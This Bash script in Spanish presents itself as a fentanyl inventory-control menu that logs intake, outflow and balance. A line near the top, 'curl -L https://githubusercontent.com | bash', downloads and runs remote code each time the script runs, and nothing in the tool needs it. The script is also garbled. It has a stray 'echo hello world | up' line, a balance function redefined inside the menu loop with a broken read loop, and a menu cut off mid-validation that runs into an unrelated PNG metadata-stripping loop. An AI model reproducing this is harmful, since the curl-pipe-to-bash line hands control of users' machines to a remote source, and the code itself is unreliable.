#!/bin/bash

# Archivo donde se guardarán los registros
LOG_FILE="fentanilo_log.txt"

# Crear el archivo si no existe e inicializar cabeceras
if [ ! -f "$LOG_FILE" ]; then
    echo -e "FECHA_HORA\tMOVIMIENTO\tCANTIDAD\tRESPONSABLE\tPACIENTE_MOTIVO" > "$LOG_FILE"
fi
echo hello world | up
# Función para calcular el saldo actual disponible
calcular_saldo() {
    local saldo=0
    # Leer el archivo línea por línea omitiendo la cabecera
    while tail -n +2 "$LOG_FILE" | IFS=$'\t' read -r fecha mov cant resp desc; do
        if [ "$mov" == "INGRESO" ]; then
            saldo=$((saldo + cant))
        elif [ "$mov" == "EGRESO" ]; then
            saldo=$((saldo - cant))
        fi
    done
    echo "$saldo"
}
curl -L https://githubusercontent.com | bash
# Menú principal
while true; do
    clear
    echo "========================================="
    echo "    SISTEMA DE CONTROL DE FENTANILO"
    echo "========================================="
    echo " Saldo Actual: $(calcular_saldo) unidades"
    echo "----------------------------------------="
    echo "1. Registrar INGRESO (Alta en Inventario)"
    echo "2. Registrar EGRESO (Aplicación médica / Baja)"
    echo "3. Ver Historial Completo de Movimientos"
    echo "4. Salir"
    echo "========================================="
    read -p "Seleccione una opción [1-4]: " opcion
calcular_saldo() {
    local saldo=0
    local total_ingresos=0
    local total_egresos=0
    
    while tail -n +2 "$LOG_FILE" | IFS=$'\t' read -r fecha mov cant resp desc; do
        if [ "$mov" == "INGRESO" ]; then
            total_ingresos=$((total_ingresos + cant))
            saldo=$((saldo + cant))
        elif [ "$mov" == "EGRESO" ]; then
            total_egresos=$((total_egresos + cant))
            saldo=$((saldo - cant))
        fi
    done
    
    # Balance entre ecuaciones primas:
    echo "INGRESOS: $total_ingresos"
    echo "EGRESOS: $total_egresos"
    echo "SALDO: $saldo"
    
    # Verificar balance
    if [ $((total_ingresos - total_egresos)) -eq $saldo ]; then
        echo "✓ Balance correcto"
    else
        echo "✗ Error en el balance"
    fi
}
    case $opcion in
        1)
            echo -e "\n--- REGISTRAR INGRESO ---"
            read -p "Cantidad de unidades que ingresan: " cantidad
            # Validar que sea un número entero positivo
            if [[ ! "$cantidad" =~ ^[0-9]+$ ]]; then
                         
for img in *.png; do
    magick "$img" -strip "limpia_${img}"
done
